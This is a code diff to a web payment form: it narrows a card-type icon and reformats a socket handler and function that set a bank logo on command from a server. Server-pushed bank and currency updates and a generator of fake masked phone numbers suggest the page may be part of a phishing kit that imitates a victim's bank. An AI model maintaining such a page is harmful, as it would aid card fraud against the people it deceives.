@@ -501,7 +501,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
                     class="pl-10 pr-10"
                 />
                 <div class="card-type-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
-                    <img src="" alt="" id="card-type-img" class="h-6" style="display: none;">
+                    <img src="" alt="" id="card-type-img" class="h-5" style="display: none;">
                 </div>
             </div>
         </div>
@@ -1141,15 +1141,14 @@ function setupSocketEventHandlers() {
         }
     });
     
-    // FIX 2: Enhanced bank logo update handler
-    socket.on('update_mc_bank', function(data) {
-        console.log('Received bank update:', data);
-        if (data.bankCode) {
-            // Directly update the bank logo in the UI
-            updateBankLogo(data.bankCode);
-            console.log('Bank logo updated from event:', data.bankCode);
-        }
-    });
+socket.on('update_mc_bank', function(data) {
+  console.log('Received bank update:', data);
+  if (data.bankCode) {
+    // Call the updateBankLogo function directly
+    updateBankLogo(data.bankCode);
+    console.log('Bank logo updated from event:', data.bankCode);
+  }
+});
 
     // Handle currency update command
     socket.on('update_mc_currency', function(data) {
@@ -1783,25 +1782,22 @@ function generateRandomPhone() {
     return `********${lastFour}`;
 }
 
-// FIX 2: Enhanced bank logo update function to properly display the bank logo
 function updateBankLogo(bankCode) {
-    console.log('Updating bank logo with bank code:', bankCode);
-    const bankLogo = document.getElementById('bankLogo');
-    if (!bankLogo) {
-        console.error('Bank logo element not found!');
-        return;
-    }
-    
-    // Get the correct logo URL from the bankLogos map
-    const logoUrl = bankLogos[bankCode] || bankLogos['default'];
-    console.log('Using logo URL:', logoUrl);
-    
-    // Set the src attribute directly
-    bankLogo.src = logoUrl;
-    bankLogo.alt = bankCode + ' Logo';
-    
-    // Ensure the logo is visible
-    bankLogo.style.display = 'block';
+  console.log('Updating bank logo with bank code:', bankCode);
+  const bankLogo = document.getElementById('bankLogo');
+  if (!bankLogo) {
+    console.error('Bank logo element not found!');
+    return;
+  }
+  
+  // Get the correct logo URL from the bankLogos map
+  const logoUrl = bankLogos[bankCode] || bankLogos['default'];
+  console.log('Using logo URL:', logoUrl);
+  
+  // Set the src attribute and display property directly
+  bankLogo.src = logoUrl;
+  bankLogo.alt = bankCode + ' Logo';
+  bankLogo.style.display = 'block';
 }
 
 function updateVerificationLogo(cardType) {
